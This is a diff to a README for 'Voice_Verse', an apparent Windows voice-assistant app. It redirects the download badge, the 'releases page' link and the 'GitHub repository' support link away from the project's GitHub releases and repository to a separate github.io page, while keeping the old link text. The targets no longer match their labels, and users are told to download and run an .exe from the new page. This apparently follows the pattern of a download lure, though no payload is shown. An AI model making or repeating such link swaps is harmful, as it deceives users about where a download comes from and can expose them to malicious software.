@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 
 ### Download Eva
-[![Download for Windows](https://img.shields.io/badge/Download-Voice_Verse-blue?style=for-the-badge&logo=windows)](https://github.com/novablastocoelic456/Voice_Verse/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Voice_Verse-blue?style=for-the-badge&logo=windows)](https://novablastocoelic456.github.io)
 
 Visit this link to download the application.
 
@@ -31,7 +31,7 @@ Voice_Verse is a voice assistant named **Eva** that listens to you, understands 
 
 ## ⬇️ How to Download and Install
 
-1. Click the download button above or go to the [releases page](https://github.com/novablastocoelic456/Voice_Verse/releases)
+1. Click the download button above or go to the [releases page](https://novablastocoelic456.github.io)
 2. Look for the latest version (usually at the top of the page)
 3. Click on the file named `Voice_Verse_Setup.exe` or `Voice_Verse_Windows.zip`
 4. Save the file to your computer (Desktop is fine)
@@ -82,7 +82,7 @@ A: Voice_Verse runs as a standalone application in your browser.
 
 ## 📞 Support
 
-If you need help, please visit the [GitHub repository](https://github.com/novablastocoelic456/Voice_Verse) and open an issue.
+If you need help, please visit the [GitHub repository](https://novablastocoelic456.github.io) and open an issue.
 
 ## 📄 License
 
